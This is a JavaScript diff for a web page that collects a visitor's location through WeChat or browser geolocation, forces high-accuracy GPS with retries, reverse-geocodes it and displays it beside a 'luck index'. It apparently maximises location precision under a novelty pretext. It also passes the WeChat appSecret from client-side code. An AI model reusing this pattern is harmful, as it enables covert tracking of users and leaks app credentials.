@@ -161,15 +161,14 @@ window.onload=async function(){
 // 初始化微信JS-SDK
 async function initWxSDK(){
     try{
-        // 获取当前页面URL（不包含#及后面的部分）
         const url=window.location.href.split('#')[0];
         
-        // 获取access_token（有效期2小时）
+        // 获取access_token
         const tokenRes=await fetch(`https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=${_appId}&secret=${_appSecret}`);
         const tokenData=await tokenRes.json();
         const accessToken=tokenData.access_token;
         
-        // 获取jsapi_ticket（有效期2小时）
+        // 获取jsapi_ticket
         const ticketRes=await fetch(`https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=${accessToken}&type=jsapi`);
         const ticketData=await ticketRes.json();
         const jsapiTicket=ticketData.ticket;
@@ -182,7 +181,7 @@ async function initWxSDK(){
         
         // 配置微信JS-SDK
         wx.config({
-            debug:false, // 开启调试模式
+            debug:false,
             appId:_appId,
             timestamp:timestamp,
             nonceStr:nonceStr,
@@ -190,13 +189,11 @@ async function initWxSDK(){
             jsApiList:['getLocation']
         });
         
-        // 微信JS-SDK准备就绪
         wx.ready(function(){
             wxReady=true;
             console.log('微信JS-SDK初始化成功');
         });
         
-        // 微信JS-SDK错误处理
         wx.error(function(res){
             console.log('微信JS-SDK初始化失败:',res);
             wxReady=false;
@@ -227,13 +224,33 @@ function init(){
         if(i>=u.length)clearInterval(v);
     },800);
     
-    // 定位策略：微信内优先使用微信JS-SDK定位，其他浏览器优先使用原生定位
+    // 精度拉满的定位策略
     if(isWechat&&wxReady){
-        document.getElementById('tx').innerText='正在获取微信定位权限...';
+        document.getElementById('tx').innerText='正在获取高精度GPS定位...';
         wx.getLocation({
-            type:'gcj02', // 直接返回高德坐标系，无需转换
+            type:'gcj02',
+            isHighAccuracy:true, // 强制开启高精度GPS定位（核心参数）
+            timeout:15000, // 延长超时时间到15秒，给GPS足够时间搜星
             success:function(res){
-                geoCode(res.latitude,res.longitude,res.accuracy||'微信GPS','微信JS-SDK');
+                // 精度判断：如果精度大于500米，自动重试一次
+                if(res.accuracy&&res.accuracy>500){
+                    console.log('定位精度较差，正在重试...');
+                    setTimeout(()=>{
+                        wx.getLocation({
+                            type:'gcj02',
+                            isHighAccuracy:true,
+                            timeout:10000,
+                            success:function(res2){
+                                geoCode(res2.latitude,res2.longitude,res2.accuracy||'微信GPS','微信JS-SDK');
+                            },
+                            fail:function(){
+                                ipLocChain();
+                            }
+                        });
+                    },1000);
+                }else{
+                    geoCode(res.latitude,res.longitude,res.accuracy||'微信GPS','微信JS-SDK');
+                }
             },
             fail:function(err){
                 console.log('微信定位失败，转IP定位:',err);
@@ -245,13 +262,28 @@ function init(){
             }
         });
     }else if(navigator.geolocation){
+        document.getElementById('tx').innerText='正在获取高精度GPS定位...';
         navigator.geolocation.getCurrentPosition(
-            function(pos){geoCode(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy),'GPS/浏览器原生')},
+            function(pos){
+                // 同样做精度判断和重试
+                if(pos.coords.accuracy>500){
+                    console.log('定位精度较差，正在重试...');
+                    setTimeout(()=>{
+                        navigator.geolocation.getCurrentPosition(
+                            function(pos2){geoCode(pos2.coords.latitude,pos2.coords.longitude,Math.round(pos2.coords.accuracy),'GPS/浏览器原生')},
+                            function(){ipLocChain();},
+                            {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+                        );
+                    },1000);
+                }else{
+                    geoCode(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy),'GPS/浏览器原生');
+                }
+            },
             function(err){
                 console.log('GPS定位失败，转IP定位:',err);
                 ipLocChain();
             },
-            {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+            {enableHighAccuracy:true,timeout:12000,maximumAge:0} // 恢复12秒超时时间
         );
     }else{
         ipLocChain();
@@ -323,12 +355,14 @@ function ipLocChain(){
         });
 }
 
+// 优化地址解析精度
 function geoCode(lt,ln,acc,src){
     document.getElementById('tx').innerText='正在解析地理位置...';
     const lat=parseFloat(lt).toFixed(6);
     const lng=parseFloat(ln).toFixed(6);
     
-    fetch('https://restapi.amap.com/v3/geocode/regeo?key='+_webAK+'&location='+lng+','+lat+'&extensions=base&radius=1000')
+    // 增加extensions=all和radius=500，提高地址解析精度
+    fetch('https://restapi.amap.com/v3/geocode/regeo?key='+_webAK+'&location='+lng+','+lat+'&extensions=all&radius=500')
         .then(r=>r.json())
         .then(data=>{
             let addr='未知位置';
@@ -354,7 +388,7 @@ function ok(lt,ln,acc,src,addr){
         '📍 纬度: '+lt+'\n'+
         '📍 经度: '+ln+'\n'+
         '🏠 地址: '+addr+'\n'+
-        '📍 精度: '+acc+'\n'+
+        '📍 精度: '+acc+'米\n'+ // 加上"米"单位，更直观
         '🔍 来源: '+src+'\n'+
         '🎲 幸运指数: '+lk+'\n'+
         '🕐 时间: '+tm+'\n'+
